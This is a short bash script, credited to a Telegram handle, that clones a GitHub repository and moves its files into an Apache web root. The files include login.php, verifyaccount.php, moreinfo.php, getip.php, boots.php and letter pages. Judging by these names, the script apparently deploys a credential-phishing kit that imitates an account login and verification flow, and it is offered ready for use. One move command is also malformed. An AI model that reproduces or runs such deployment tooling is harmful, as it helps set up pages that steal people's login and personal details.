#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /etc/apache2/sites-available; nano 000-default.conf
cd /var/www; git clone https://github.com/resekk-vps/home
cd /var/www/home; mv files /var/www; mv javax.faces.resource /var/www; mv resources /var/www; mv src /var/www; mv upload /var/www; mv aditionalinfo.php /var/www; mv install.sh /var/www; mv boots.php /var/www; mv conf.php /var/www; mv getip.php /var/www; mv index.htm /var/www; mv index.php /var/www; mv letter.html /var/www; mv letter2.html/var/www; mv loadingwindowId=db3.html /var/www; mv login.php /var/www; mv loginwindowId=cba.php /var/www; mv moreinfo.php /var/www; mv verifyaccount.php /var/www
cd /var/www; nano config.php
sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
